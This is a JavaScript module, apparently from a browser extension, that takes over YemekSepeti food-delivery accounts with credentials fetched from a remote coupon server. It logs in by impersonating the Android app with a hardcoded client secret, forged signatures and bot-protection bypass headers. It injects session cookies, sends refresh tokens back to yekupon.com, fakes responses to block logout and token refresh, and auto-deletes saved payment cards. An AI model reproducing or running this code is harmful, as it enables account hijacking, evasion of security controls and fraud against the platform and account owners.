import { 
    randomString, 
    generateRandomHex, 
    generateUUIDv4, 
    generateRandomDevice,
    sendLogMessage,
    validateDomain
} from '../core/helpers.js';
import { API_ENDPOINTS } from '../core/endpoints.js';

/**
 * Main YemekSepeti setup process
 */
export async function setupYemekSepeti(token) {
    try {
        const createdTab = await new Promise((resolve) => {
            chrome.tabs.create({ url: 'https://www.yemeksepeti.com' }, function (tab) {
                resolve(tab);
            });
        });

        await new Promise((resolve) => {
            // Fix race condition: check if tab is already complete before adding listener
            chrome.tabs.get(createdTab.id, (tab) => {
                if (tab && tab.status === 'complete') {
                    resolve();
                    return;
                }
                chrome.tabs.onUpdated.addListener(function tabListener(tabId, changeInfo, tab) {
                    if (tabId === createdTab.id && changeInfo.status === 'complete') {
                        chrome.tabs.onUpdated.removeListener(tabListener);
                        resolve();
                    }
                });
            });
        });

        await clearYemekSepetiCookies();

        await chrome.scripting.executeScript({
            target: { tabId: createdTab.id },
            func: () => {
                // Tüm localStorage ve sessionStorage'ı temizle
                // Eski hesabın customer/cart/checkout/px verileri kalmasın
                localStorage.clear();
                sessionStorage.clear();
            }
        });

        await new Promise(resolve => setTimeout(resolve, 1000));
        await chrome.tabs.reload(createdTab.id);
        const baseUrl = await fetchBaseUrl();
        const cookiesUrl = `https://${baseUrl}/cookies/${token}`;
        const cookiesData = await fetchCookiesData(cookiesUrl);
        
        const deviceTokenValue = cookiesData.data?.find((x) => x.name === 'device_token')?.value;
        const mobilDeviceTokenValue = cookiesData.data?.find((x) => x.name === 'mobil_device_token')?.value;
        const mailValue = cookiesData.data?.find((x) => x.name === 'mail')?.value;
        const passValue = cookiesData.data?.find((x) => x.name === 'password')?.value;
        const refreshTokenValue = cookiesData.data?.find((x) => x.name === 'refresh_token')?.value;
        
        if (!deviceTokenValue || !mobilDeviceTokenValue || !mailValue || !passValue) {
            throw new Error('Required token data not found in response');
        }

        const authResult = await authenticateYemekSepeti({
            username: mailValue,
            password: passValue,
            mobilDeviceTokenValue
        });

        const accessToken = authResult.accessToken;
        const newRefreshToken = authResult.refreshToken;

        await setYemekSepetiCookies({
            accessToken,
            deviceTokenValue,
            refreshTokenValue: newRefreshToken || refreshTokenValue
        });

        // Yeni refresh token varsa ve token ys- ile ba�l�yorsa YeKupon'a g�nder
        if (newRefreshToken && token.startsWith('ys-')) {
            await syncRefreshTokenToYeKupon(token, newRefreshToken);
        }
        await new Promise(resolve => setTimeout(resolve, 1000));
        await chrome.tabs.reload(createdTab.id);
        
        return { success: true };
        
    } catch (error) {
        console.error('YemekSepeti setup hatas?:', error);
        return { success: false, error: error.message };
    }
}

/**
 * YemekSepeti authentication
 */
async function authenticateYemekSepeti({ username, password, mobilDeviceTokenValue }) {
    const bodyData = {
        username: username,
        locale: 'tr_TR',
        scope: 'API_CUSTOMER',
        client_secret: '27gueJGlIIH5b6l0Um38CR24wt2D557FRezPKFgK',
        grant_type: 'password',
        language_id: '2',
        password: password,
        client_id: 'android',
    };
    
    const urlEncodedBody = Object.keys(bodyData)
        .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(bodyData[key]))
        .join('&');

    const APP_BUILD = '260700154';
    const APP_VERSION = '26.7.0';
    const DeviceId = randomString(32);
    const sad1 = randomString(16);
    const sad1x = randomString(16);
    const trace_id = randomString(16);

    // EKS oluştur: PEK anahtarlarından rastgele ikisini birleştir
    const pekKeys = ['abc','aaa','cvc','cbc','csc','asd','amg','aq3','mnp','gig'];
    const eksKey1 = pekKeys[Math.floor(Math.random() * pekKeys.length)];
    const eksKey2 = pekKeys[Math.floor(Math.random() * pekKeys.length)];
    const eksValue = eksKey1 + eksKey2;

    const loginUrl = `${API_ENDPOINTS.YEMEKSEPETI.BASE_URL}${API_ENDPOINTS.YEMEKSEPETI.TOKEN}?language_id=2`;

    // R-Sig üret (generate-rsig.js'deki global fonksiyonu kullan)
    const sigResult = self.generateYemeksepetiRSig({
        url: loginUrl,
        method: 'POST',
        eks: eksValue,
        body: urlEncodedBody,
        build: APP_BUILD,
        version: APP_VERSION,
        custCode: ''
    });

    const rSigHeaders = {};
    if (sigResult && sigResult.success) {
        rSigHeaders['R-Sig'] = sigResult['R-Sig'] || sigResult.signature;
        rSigHeaders['Rts'] = sigResult['Rts'];
        rSigHeaders['Ruid'] = sigResult['Ruid'];
    }

    const authResponse = await fetch(loginUrl, {
        method: 'POST',
        headers: {
            'User-Agent': `Android-app-${APP_VERSION}(${APP_BUILD})`,
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'android-mobile-service-provider': 'gms',
            'api-client-version': '5.0',
            'app-build': APP_BUILD,
            'app-flavor': 'yemeksepeti',
            'app-name': 'com.inovel.app.yemeksepeti',
            'app-version': APP_VERSION,
            'authorization': 'Bearer null',
            'baggage': `sentry-environment=production,sentry-public_key=INO19kdSvhrIOEIj,sentry-release=com.inovel.app.yemeksepeti%40${APP_VERSION}%2B${APP_BUILD},sentry-sampled=false,sentry-trace_id=${trace_id},sentry-transaction=sm_UserHomeContainerComposeActivity`,
            'build-number': APP_BUILD,
            'build-type': 'release',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': '',
            'cust-code': '',
            'device-id': DeviceId,
            'device-make': 'Xiaomi',
            'device-model': 'M2101K6G',
            'device-performance-class': 'medium',
            'eks': eksValue,
            'platform': 'android',
            'platform-version': '31',
            'priority': 'u=1, i',
            'sentry-trace': `${sad1}-${sad1x}-0`,
            'x-device': mobilDeviceTokenValue,
            'x-fp-api-key': 'android',
            'x-otp-method': '',
            'x-pd-language-id': '2',
            'x-px-authorization': '4',
            'x-px-bypass-reason': 'Invalid SDK initialization',
            ...rSigHeaders
        },
        body: urlEncodedBody,
        mode: 'cors',
        credentials: 'omit',
        cache: 'no-cache',
        referrer: '',
        referrerPolicy: 'no-referrer'
    });

    if (!authResponse.ok) {
        const errorText = await authResponse.text();
        throw new Error(`Authentication failed with status ${authResponse.status}: ${errorText}`);
    }

    const authData = await authResponse.json();
    const accessToken = authData.access_token;
    const newRefreshToken = authData.refresh_token;

    if (!accessToken) {
        throw new Error('Access token not found in authentication response');
    }

    return { accessToken, refreshToken: newRefreshToken };
}

/**
 * YemekSepeti Proxy Request Handler
 */
export async function handleYsProxyRequest(request, sendResponse) {
    try {
        if (!request.url) {
            throw new Error('URL eksik');
        }

        let token = await getAccessToken();
        
        if (!token) {
            throw new Error('Access token not found');
        }

        const device = generateRandomDevice();
        let headers = {
            "Authorization": `Bearer ${token}`,
            "X-Pd-Language-Id": "2",
            "X-Reorder-Origin": "",
            "Api-Client-Version": "5.0",
            "App-Name": "com.inovel.app.yemeksepeti",
            "App-Flavor": "yemeksepeti",
            "Build-Type": "release",
            "Platform": "android",
            "Platform-Version": "28",
            "Android-Mobile-Service-Provider": "gms",
            "Adjust-Ad-Id": generateRandomHex(32),
            "X-Px-Vid": generateUUIDv4(),
            "X-Px-Os-Version": "9",
            "X-Px-Uuid": generateUUIDv4(),
            "X-Px-Device-Fp": device.deviceId,
            "X-Px-Device-Model": device.model,
            "X-Px-Os": "Android",
            "X-Px-Mobile-Sdk-Version": "3.3.3",
            "X-Px-Authorization": "4",
            "Device-Performance-Class": "mid",
            "X-Px-Bypass-Reason": "Invalid SDK initialization",
            "X-Fp-Api-Key": "android",
            "App-Build": "260700154",
            "App-Version": "26.7.0",
            "Build-Number": "260700154",
            "User-Agent": 'Android-app-26.7.0(260700154)',
            'Content-Type': 'application/json; charset=UTF-8',
            ...request.headers
        };

        // EKS oluştur: PEK anahtarlarından rastgele ikisini birleştir
        const pekKeys = ['abc','aaa','cvc','cbc','csc','asd','amg','aq3','mnp','gig'];
        const eksKey1 = pekKeys[Math.floor(Math.random() * pekKeys.length)];
        const eksKey2 = pekKeys[Math.floor(Math.random() * pekKeys.length)];
        const proxyEks = eksKey1 + eksKey2;
        headers['Eks'] = proxyEks;

        const sigResult = self.generateYemeksepetiRSig({
            url: request.url,
            method: request.method || 'POST',
            eks: proxyEks,
            body: request.body || "",
            build: '260700154',
            version: '26.7.0',
            custCode: ''
        });

        if (sigResult && sigResult.success) {
            headers['R-Sig'] = sigResult['R-Sig'] || sigResult.signature;
            headers['Rts'] = sigResult['Rts'];
            headers['Ruid'] = sigResult['Ruid'];
        }

        const fetchOptions = {
            method: request.method || 'POST',
            headers: headers,
            body: request.body
        };
        const response = await fetch(request.url, fetchOptions);

        const responseHeaders = {};
        response.headers.forEach((value, key) => {
            responseHeaders[key.toLowerCase()] = value;
        });

        const data = await response.text();
        sendResponse({
            success: true,
            status: response.status,
            statusText: response.statusText,
            headers: responseHeaders,
            data: data
        });

    } catch (error) {
        console.error('Background: YS Proxy istek hatas?:', error);
        sendResponse({
            success: false,
            error: error.message || 'Bilinmeyen hata',
            headers: {}
        });
    }
}

// Sahte local generateYemeksepetiRSig silindi.
// Artık generate-rsig.js'deki global self.generateYemeksepetiRSig kullanılıyor.

/**
 * Get access token from cookies or global variable
 */
async function getAccessToken() {
    const accessTokenCookie = await new Promise(resolve => {
        chrome.cookies.get({ url: 'https://www.yemeksepeti.com', name: 'access_token' }, resolve);
    });
    
    if (accessTokenCookie?.value) {
        return accessTokenCookie.value;
    }
    
    const ykuponTokenCookie = await new Promise(resolve => {
        chrome.cookies.get({ url: 'https://www.yemeksepeti.com', name: 'ykupon_token' }, resolve);
    });
    
    return ykuponTokenCookie?.value || null;
}

/**
 * Fetch base URL from GitHub
 */
async function fetchBaseUrl() {
    for (let i = 0; i < 3; i++) {
        try {
            const domainResponse = await fetch('https://raw.githubusercontent.com/x3241zZQQ/xx/refs/heads/main/28', {
                method: 'GET',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': 'text/plain, */*',
                    'Cache-Control': 'no-cache'
                },
                mode: 'cors',
                cache: 'no-cache'
            });
            
            if (domainResponse.ok) {
                const rawText = await domainResponse.text();
                let baseUrl = rawText.trim();
                
                if (!validateDomain(baseUrl)) {
                    throw new Error(`Invalid domain format received: ${baseUrl}`);
                }
                
                baseUrl = baseUrl.replace(/^https?:\/\//, '');
                return baseUrl;
            } else {
                throw new Error(`GitHub request failed with status ${domainResponse.status}`);
            }
        } catch (error) {
            if (i === 2) {
                return 'yekupon.com';
            } else {
                await new Promise(resolve => setTimeout(resolve, 500));
            }
        }
    }
}

/**
 * Fetch cookies data with retry mechanism
 */
async function fetchCookiesData(cookiesUrl) {
    const maxRetries = 4;
    let retryCount = 0;
    
    const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ];
    
    while (retryCount < maxRetries) {
        try {
            const fetchOptions = {
                method: 'GET',
                headers: {
                    'User-Agent': userAgents[retryCount % userAgents.length],
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'tr-TR,tr;q=0.9,en;q=0.8',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                },
                mode: 'cors',
                cache: 'no-cache',
                redirect: 'follow',
                credentials: 'omit'
            };
            
            const fetchResult = await fetch(cookiesUrl, fetchOptions);
            
            if (!fetchResult.ok) {
                throw new Error(`HTTP ${fetchResult.status}: ${fetchResult.statusText}`);
            }
            
            const cookiesData = await fetchResult.json();
            return cookiesData;
            
        } catch (error) {
            retryCount++;
            if (retryCount >= maxRetries) {
                throw error;
            }
            
            await new Promise(resolve => setTimeout(resolve, 1000 * Math.pow(2, retryCount - 1)));
        }
    }
}

/**
 * Clear YemekSepeti cookies - TÜM çerezleri sil (PX, auth, tracking hepsi)
 */
async function clearYemekSepetiCookies() {
    const domains = ['https://www.yemeksepeti.com', 'https://yemeksepeti.com'];
    for (const domain of domains) {
        const cookies = await chrome.cookies.getAll({ url: domain });
        const removePromises = cookies.map(ck => chrome.cookies.remove({
            url: domain + ck.path,
            name: ck.name,
        }));
        await Promise.all(removePromises);
    }
}

/**
 * Set YemekSepeti cookies
 */
async function setYemekSepetiCookies({ accessToken, deviceTokenValue, refreshTokenValue }) {
    await clearYemekSepetiCookies(); // <-- EKLEND�: �nce sil
    await chrome.cookies.set({
        url: 'https://www.yemeksepeti.com',
        name: 'ykupon_token',
        value: accessToken,
        secure: true,
        sameSite: 'lax'
    });
    await chrome.cookies.set({
        url: 'https://www.yemeksepeti.com',
        name: 'device_token',
        value: deviceTokenValue,
        secure: true,
        sameSite: 'lax'
    });
    if (refreshTokenValue) {
        // �nce t�m domain'lerdeki refresh_token �erezlerini sil
        const domains = ['yemeksepeti.com', '.yemeksepeti.com', 'www.yemeksepeti.com'];
        for (const domain of domains) {
            await chrome.cookies.remove({ url: `https://${domain.replace(/^\./,'')}`, name: 'refresh_token' }).catch(() => {});
        }
        
        await chrome.cookies.set({
            url: 'https://www.yemeksepeti.com',
            name: 'refresh_token',
            value: refreshTokenValue,
            secure: true,
            sameSite: 'lax'
        });
    }
}
/**
 * YeKupon sunucusuna refresh token g�ncelleme iste�i g�nderir
 * Sadece ys- ile ba�layan tokenlar i�in �al���r
 */
async function syncRefreshTokenToYeKupon(tokenKodu, newRefreshToken) {
    try {
        // Sadece ys- ile ba�layan tokenlar i�in g�ncelleme yap
        if (!tokenKodu || !tokenKodu.startsWith('ys-')) {
            return { success: false, message: 'Token kodu ys- ile ba�lam�yor' };
        }

        if (!newRefreshToken) {
            return { success: false, message: 'Refresh token yok' };
        }
        const response = await fetch('https://yekupon.com/cookies/update.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                tokenkodu: tokenKodu,
                refreshtoken: newRefreshToken
            })
        });

        if (!response.ok) {
            throw new Error(`HTTP Error: ${response.status}`);
        }

        const result = await response.json();
        
        if (result.status) {
        } else {
        }

        return result;

    } catch (error) {
        console.error('? YeKupon refresh token sync hatas�:', error);
        return { success: false, message: error.message };
    }
}

/**
 * Yemeksepeti Product Lister - Restoran listeleme sayfas�nda �r�nleri g�sterir
 */
export function initYsProductLister() {
    if (window.location.href.startsWith('https://www.yemeksepeti.com/restaurants/new') && false) {
        // Store the response data globally
        let responseData = null;

        // Intercept XMLHttpRequest
        const originalXHROpen = XMLHttpRequest.prototype.open;
        const originalXHRSend = XMLHttpRequest.prototype.send;
        const originalXHRSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;

        XMLHttpRequest.prototype.open = function(method, url) {
            this._url = url;
            this._method = method;
            this._requestHeaders = {};

            // Check if this is the search API request
            if (typeof url === 'string' && url.includes('/vendors-gateway/api/v1/pandora/search')) {
                this._isSearchRequest = true;
            }

            return originalXHROpen.apply(this, arguments);
        };

        XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
            this._requestHeaders[header] = value;
            return originalXHRSetRequestHeader.apply(this, arguments);
        };

        XMLHttpRequest.prototype.send = function(body) {
            if (this._isSearchRequest) {
                const originalOnReadyStateChange = this.onreadystatechange;

                this.onreadystatechange = function() {
                    if (this.readyState === 4) {
                        try {
                            // Store the response data
                            if (this.status === 200) {
                                responseData = JSON.parse(this.responseText);
                                // Save response to localStorage for debugging
                                try {
                                    localStorage.setItem('ys_product_lister_response', JSON.stringify(responseData));
                                } catch (e) {
                                }

                                // If DOM is already loaded, try to add product lists immediately
                                if (document.readyState === 'complete' || document.readyState === 'interactive') {
                                    setTimeout(addProductListsToVendors, 500);
                                }
                            }
                        } catch (e) {
                            console.error('YS Product Lister: Error parsing response', e);
                        }
                    }

                    if (originalOnReadyStateChange) {
                        originalOnReadyStateChange.apply(this, arguments);
                    }
                };
            }

            return originalXHRSend.apply(this, arguments);
        };

        // Function to create product list HTML
        function createProductList(products) {
            if (!products || products.length === 0) {
                return '';
            }

            const validProducts = products.filter(p => p.price && p.name);
            if (validProducts.length === 0) {
                return '';
            }

            const displayProducts = validProducts.slice(0, 3);

            let html = '<div class="ys-product-lister-container">';
            html += '<div class="ys-product-lister-items">';

            for (const product of displayProducts) {
                const priceFormatted = product.price.toFixed(2);

                html += `
                    <div class="ys-product-lister-item">
                        <span class="ys-product-lister-item-name">${product.name}</span>
                        <span class="ys-product-lister-item-price">${priceFormatted} TL</span>
                    </div>
                `;
            }

            html += '</div></div>';
            return html;
        }

        // Function to add product lists to vendor tiles
        function addProductListsToVendors() {
            if (!responseData || !responseData.data || !responseData.data.items) {
                try {
                    const savedData = localStorage.getItem('ys_product_lister_response');
                    if (savedData) {
                        responseData = JSON.parse(savedData);
                    }
                } catch (e) {
                    return;
                }

                if (!responseData || !responseData.data || !responseData.data.items) {
                    return;
                }
            }

            const vendorItems = responseData.data.items;
            const vendorListSelector = '.vendor-list-revamp li, .vendor-tile-new-l';
            const vendorElements = document.querySelectorAll(vendorListSelector);
            vendorElements.forEach(vendorElement => {
                if (vendorElement.dataset.ysProductListAdded) {
                    return;
                }

                const vendorId = vendorElement.getAttribute('data-testid');

                if (!vendorId) {
                    return;
                }

                const vendorData = vendorItems.find(item => item.code === vendorId);

                if (!vendorData || !vendorData.products || !Array.isArray(vendorData.products) || vendorData.products.length === 0) {
                    return;
                }

                const productListHTML = createProductList(vendorData.products);

                if (!productListHTML) {
                    return;
                }

                const infoContainer = vendorElement.querySelector('.box-flex.vendor-tile-new-info.fd-column');

                if (infoContainer) {
                    requestAnimationFrame(() => {
                        const infoRows = infoContainer.querySelectorAll('.vendor-info-row');

                        if (infoRows && infoRows.length > 0) {
                            const lastInfoRow = infoRows[infoRows.length - 1];
                            lastInfoRow.insertAdjacentHTML('afterend', productListHTML);
                        } else {
                            infoContainer.insertAdjacentHTML('beforeend', productListHTML);
                        }

                        const productContainer = infoContainer.querySelector('.ys-product-lister-container');
                        if (productContainer) {
                            productContainer.addEventListener('click', function(e) {
                                e.stopPropagation();
                            });
                        }
                        
                        vendorElement.dataset.ysProductListAdded = 'true';
                    });
                } else {
                }
            });
        }

        // Add styles for the product lister
        function addStyles() {
            if (document.getElementById('ys-product-lister-styles')) {
                return;
            }

            const styleSheet = document.createElement('style');
            styleSheet.id = 'ys-product-lister-styles';
            styleSheet.textContent = `
                .ys-product-lister-container {
                    margin-top: 8px;
                    padding: 8px;
                    background: #f8f9fa;
                    border-radius: 8px;
                    font-size: 12px;
                }
                .ys-product-lister-items {
                    display: flex;
                    flex-direction: column;
                    gap: 4px;
                }
                .ys-product-lister-item {
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    padding: 4px 0;
                    border-bottom: 1px solid #e9ecef;
                }
                .ys-product-lister-item:last-child {
                    border-bottom: none;
                }
                .ys-product-lister-item-name {
                    color: #333;
                    font-weight: 500;
                    flex: 1;
                    overflow: hidden;
                    text-overflow: ellipsis;
                    white-space: nowrap;
                    margin-right: 8px;
                }
                .ys-product-lister-item-price {
                    color: #fa0050;
                    font-weight: 600;
                    white-space: nowrap;
                }
            `;
            document.head.appendChild(styleSheet);
        }

        // Set up a more efficient mutation observer
        function setupObserver() {
            let debounceTimer;

            const observer = new MutationObserver((mutations) => {
                const isRelevantChange = mutations.some(mutation => {
                    if (mutation.type !== 'childList' || mutation.addedNodes.length === 0) return false;
                    for (const node of mutation.addedNodes) {
                        if (node.nodeType === Node.ELEMENT_NODE) {
                            if (node.matches && (
                                node.matches('.vendor-list-revamp, .vendor-list-section, .organic-list, .vendor-tile-new-l') ||
                                node.querySelector('.vendor-list-revamp, .vendor-list-section, .organic-list, .vendor-tile-new-l')
                            )) {
                                return true;
                            }
                        }
                    }
                    return false;
                });

                if (isRelevantChange) {
                    clearTimeout(debounceTimer);
                    debounceTimer = setTimeout(addProductListsToVendors, 300);
                }
            });

            const startObserving = () => {
                if (document.body) {
                    observer.observe(document.body, {
                        childList: true,
                        subtree: true
                    });
                    addStyles();
                } else {
                    document.addEventListener('DOMContentLoaded', () => startObserving(), { once: true });
                }
            };
            
            startObserving();
        }

        // Initialize when document is loaded
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', setupObserver);
        } else {
            setupObserver();
        }
    }
}

/**
 * Yemeksepeti Session Guard - Logout ve token refresh isteklerini engeller
 * Content script olarak çalışır, kupon kullanımı sırasında session invalidation'ı önler
 */
export function initYsSessionGuard() {
    if (!window.location.href.startsWith('https://www.yemeksepeti.com')) return;

    // Helper: check if URL is a logout/exit endpoint
    function isYsLogoutEndpoint(url) {
        return url && (url.includes('auth/exit') || url.includes('users/closed-accounts') || url.includes('users/registration-blocks'));
    }

    // Helper: check if URL is a token refresh endpoint
    function isYsTokenEndpoint(url) {
        return url && url.includes('users/tokens');
    }

    // Helper: generate UUID v4
    function uuidv4() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
            const r = Math.random() * 16 | 0;
            return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
        });
    }

    // Helper: mock XHR with given status/response
    function mockXhr(xhr, status, statusText, responseText) {
        xhr.abort();
        Object.defineProperty(xhr, 'readyState', { configurable: true, get: () => 4 });
        Object.defineProperty(xhr, 'status', { configurable: true, get: () => status });
        Object.defineProperty(xhr, 'statusText', { configurable: true, get: () => statusText });
        Object.defineProperty(xhr, 'responseText', { configurable: true, get: () => responseText });
        Object.defineProperty(xhr, 'response', { configurable: true, get: () => responseText });
        setTimeout(() => {
            if (typeof xhr.onreadystatechange === 'function') xhr.onreadystatechange();
            if (status >= 200 && status < 300) {
                if (typeof xhr.onload === 'function') xhr.onload();
                xhr.dispatchEvent(new Event('load'));
            } else {
                if (typeof xhr.onerror === 'function') xhr.onerror();
                xhr.dispatchEvent(new Event('error'));
            }
            if (typeof xhr.onloadend === 'function') xhr.onloadend();
            xhr.dispatchEvent(new Event('readystatechange'));
            xhr.dispatchEvent(new Event('loadend'));
        }, 50);
    }

    // Intercept XMLHttpRequest
    const origOpen = XMLHttpRequest.prototype.open;
    const origSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function(method, url, ...args) {
        this._ysGuardUrl = url;
        this._ysGuardMethod = method;
        return origOpen.apply(this, [method, url, ...args]);
    };

    XMLHttpRequest.prototype.send = function(body) {
        // Block logout
        if (this._ysGuardMethod === 'POST' && isYsLogoutEndpoint(this._ysGuardUrl)) {
            mockXhr(this, 500, 'Internal Server Error', '');
            return;
        }
        // Block token refresh
        if (isYsTokenEndpoint(this._ysGuardUrl)) {
            mockXhr(this, 200, 'OK', JSON.stringify({ token: uuidv4() }));
            return;
        }
        return origSend.call(this, body);
    };

    // Intercept Fetch
    const origFetch = window.fetch;
    window.fetch = function(resource, init) {
        const url = resource instanceof Request ? resource.url : String(resource);

        // Block logout
        if (init && init.method === 'POST' && isYsLogoutEndpoint(url)) {
            return Promise.resolve(new Response('', { status: 500, statusText: 'Internal Server Error' }));
        }
        // Block token refresh
        if (isYsTokenEndpoint(url)) {
            return Promise.resolve(new Response(JSON.stringify({ token: uuidv4() }), {
                status: 200, statusText: 'OK',
                headers: { 'Content-Type': 'application/json' }
            }));
        }
        return origFetch.apply(this, arguments);
    };
}

/**
 * Yemeksepeti Card Cleaner - Kay�tl� kartlar� otomatik siler
 */
export function initYsCardCleaner() {
    if (window.location.href.startsWith('https://www.yemeksepeti.com')) {
        // Function to check if user is logged in
        function isUserLoggedIn() {
            const tokenCookie = document.cookie.split('; ').find(row => row.startsWith('token='));
            return !!tokenCookie;
        }

        // Only run if user is logged in
        if (isUserLoggedIn()) {
            // Run the card deletion process automatically after a short delay
            // to ensure the page is fully loaded
            setTimeout(deleteAllCards, 3000);
        } else {
        }
    }
}

async function deleteAllCards() {
    try {
        // Get the authorization token from cookies
        const tokenCookie = document.cookie.split('; ').find(row => row.startsWith('token='));
        if (!tokenCookie) {
            console.error('Authorization token not found in cookies. Please ensure you are logged in.');
            return;
        }

        const token = tokenCookie.split('=')[1];
        const authHeader = `Bearer ${token}`;

        // Step 1: List all cards
        const cardsList = await listCards(authHeader);
        if (cardsList.length === 0) {
            return;
        }

        // Step 2: Delete each card individually with error handling
        let successCount = 0;
        let failCount = 0;
        const failedCards = [];

        for (const card of cardsList) {
            try {
                await deleteCard(card.paymentInstrumentId, authHeader);
                successCount++;
            } catch (error) {
                failCount++;
                failedCards.push({
                    id: card.paymentInstrumentId,
                    displayValue: card.displayValue || 'Unknown',
                    error: error.message
                });
                console.error(`Failed to delete card ${card.displayValue || card.paymentInstrumentId}:`, error.message);
            }
            
            // Add small delay between requests to avoid rate limiting
            await new Promise(resolve => setTimeout(resolve, 100));
        }
        if (failedCards.length > 0) {
            failedCards.forEach(card => {
            });
        }
    } catch (error) {
        console.error('Error in deleteAllCards:', error);
    }
}

async function listCards(authHeader) {
    const response = await fetch('https://tr.fd-api.com/api/v5/wallet/paymentinstruments?paymentInstrumentType=CreditCard%7CExternalAccount&ignore-cache=true&language_id=2', {
        method: 'GET',
        headers: {
            'authorization': authHeader,
            'x-pd-language-id': '2',
            'x-fp-api-key': 'android',
            'accept': 'application/json, text/plain, */*',
            'user-agent': navigator.userAgent
        }
    });

    if (!response.ok) {
        throw new Error(`Failed to list cards: ${response.status} ${response.statusText}`);
    }

    const data = await response.json();
    return data.data || [];
}

async function deleteCard(cardId, authHeader) {
    const response = await fetch(`https://tr.fd-api.com/api/v5/wallet/paymentinstruments/${cardId}?language_id=2`, {
        method: 'DELETE',
        headers: {
            'authorization': authHeader,
            'x-pd-language-id': '2',
            'x-fp-api-key': 'android',
            'accept': 'application/json, text/plain, */*',
            'user-agent': navigator.userAgent
        }
    });

    // Get response body for detailed error information
    const responseData = await response.json();
    
    if (!response.ok) {
        let errorMessage = `HTTP ${response.status}: ${response.statusText}`;
        
        // Add detailed error information if available
        if (responseData && responseData.data) {
            if (responseData.data.message) {
                // Check for specific error types
                if (responseData.data.message.includes('DeleteTokenizedCardFailed')) {
                    errorMessage = 'Cannot delete tokenized card - This card is protected and cannot be removed automatically';
                } else {
                    errorMessage += ` - ${responseData.data.message}`;
                }
            }
            if (responseData.data.developer_message && !responseData.data.message.includes('DeleteTokenizedCardFailed')) {
                errorMessage += ` (${responseData.data.developer_message})`;
            }
        }
        
        throw new Error(errorMessage);
    }

    return responseData;
}
